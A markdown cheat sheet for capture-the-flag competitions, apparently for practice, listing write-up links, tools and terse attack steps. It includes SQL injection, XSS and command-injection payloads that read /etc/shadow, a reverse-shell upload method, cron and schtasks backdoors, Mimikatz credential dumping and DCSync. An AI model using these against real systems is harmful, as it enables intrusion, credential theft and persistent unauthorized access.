# Writeups
* [HTB Cyber Apocalypse 2023 writeups](https://github.com/sbencoding/htb_ca2023_writeups)
* [Siunam321 writeups](https://siunam321.github.io/ctf/) - Long list of solutions from CTFs/TryHackMe/Wargames/HTB
* [InfoSecWriteups - CTF Cheatsheet](https://infosecwriteups.com/use-these-cheatsheets-to-increase-your-ctf-speed-ca12a01d396a) - INTEGRATE THIS INTO CHEAT SHEET BELOW

# CTF Techniques
* [Steps to follow in a CTF](https://github.com/chreniuc/CTF)
# Web
Hidden pages
* Run `Dirbuster`, `dirb`, or `gobuster` to get a directory tree and insecure files
* Inspect robots.txt : www.website.com/robots.txt
* Inspect website headers: `curl -I website.com/page.php`

Hidden details - Use "Find" in page source to search: Login, Password, Admin, Administrator, Success
Passwords - Always try password=username first, then shorter/obvious password lists, before running rockyou.txt

[Admin Access through weak password update process - Walkthrough](https://siunam321.github.io/ctf/Cyber-Apocalypse-2023/Web/Passman/)
* Create user --> BurpSuite Interceptor ON --> Update Password --> Burp Repeater request to change "admin" password 

## SQL Inj 
Attempt login with: `admin' OR 1=1`, `' OR 1=1-- -`, `" OR 1=1-- -`, `" OR 1 or "`, `admin"-- -"`, `admin;-- -'`

## Reflected XSS 
Put any of the following into address bars, comment fields or any Java fields: <script>alert(flag)</script>, <sScriptCRIPT>alert(flag)</sSCRIPTcript>, 

## OS Inj
Run [valid input] followed by: `|| cat ../flag.txt`, `| cat ../flag.txt`, `&& cat ../flag.txt`, `& cat ../flag.txt`, `; cat ../flag.txt`
Run [valid input] followed by: `|| cat ../../etc/passwd`, `| cat ../etc/shadow`, `&& cat ../etc/shadow`, `& cat ../etc/shadow`, `; cat ../etc/shadow`
Run [valid input] followed by: `|| ifconfig`, `| ifconfig`, `&& ifconfig`, `& ifconfig`, `; ifconfig`

Input following into address bar with "?" options: `?message=;system` , `?page='netstat`
Other options for breaks: ' " : 

## Directory Traversal
Inspect address bar and use variations of `?page=disclaimer_2.txt` to find files/directories (eg. `?page=old_disclaimers/disclaimer_1.txt`)

## Local File Inclusion

Any option to upload a file: make sure it's php. 
* [PHP Sandbox](https://onlinephp.io/) - Testing PHP code
* [PHP - Reverse Shell](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php) - Edit and upload this, run nc listener, then access file from target server to establish a shell
* If whitelisting is being used, add an extension to PHP file (eg. cats.php.jpg)

## Remote File Inclusion

## Linux - Host Enumeration
* `Nmap -A -v ipaddress` (-A for aggressive, -v for verbose) [-sV not required with -A]
* `Nmap -sC -sV ipaddress` (-sC for script scan, -sV for Version detection)

Linux Post-exploitation: ls, cat, locate, cat /etc/users
* `getuid` , `search -f flag`, `locate flag`
* Attempt escalation with `sudo -u#-1 bash` for root
* Persistent backdoor through `cron`

Windows Post-exploitation: dir, type, find, net users
* Persistent backdoor through `schtasks` (check task names with `schtasks /query /TN flag /FO list /v`
* Check `C:\` & `C:\Users\Public\Documents`
* Lateral: Search Metasploit for `psexec` exploit to login to Domain Controller
  * Dump SAM with Metasploit/Mimikatz: `kiwi_cmd lsa_dump_sam` (Find Hash NTLM, crack with `john --format=NT hashfile.txt`)
  * Dump LSA cache with Metasploit/Mimikatz: `kiwi_cmd lsadump::cache` (Find MsCacheV2, crack with `john --format=mscash2 hashfile.txt`)
* On Domain Controller: Run DC Sync for admin users eg. `dcsync_ntlm administrator`
_______________________________________________________

# Reversing
* Run `Strings <file> | grep flag`
* [Excellent Reversing Examples - NitroLabs](https://nitrolabs.xyz/posts/HTB-CA2023-Reversing-HW-Misc/)
* [Reverse Engineering for Beginners - Free ELearning](https://www.begin.re/)
* [Cutter - RE Platform for Linux](https://cutter.re/)
 * [Cutter Example with HTB CTF2023 Challenge "Shatter Tablet"](https://www.youtube.com/watch?v=iCNLn3nvEZA)
* [IDA - Common Code Disassembler](https://hex-rays.com/ida-free/)
 * [IDA Basics Tutorial](https://resources.infosecinstitute.com/topic/basics-of-ida-pro-2/)
* [Ghidra - Common Decompiler](https://ghidra-sre.org/)
 * [Ghidra - NSA GitHub](https://github.com/NationalSecurityAgency/ghidra)
 * [Ghidra Install & Basics Tutorial](https://www.kalilinux.in/2021/06/ghidra-reverse-engineering-kali-linux.html)

# Forensics
* [Excellent Forensics Examples - NitroLabs](https://nitrolabs.xyz/posts/HTB-CA2023-Forensics/)  
* Wireshark Filter: `http contains flag`, `tcp contains flag`
  * Right-click packet and select `Follow stream`
* [Chainsaw - Windows Forensics Tool - GitHub](https://github.com/WithSecureLabs/chainsaw)  
* ps1 = Powershell

# Crypto
* [Cracking RSA with Chinese Remainder Theory - Calculator](https://asecuritysite.com/rsa/rsa_ctf02)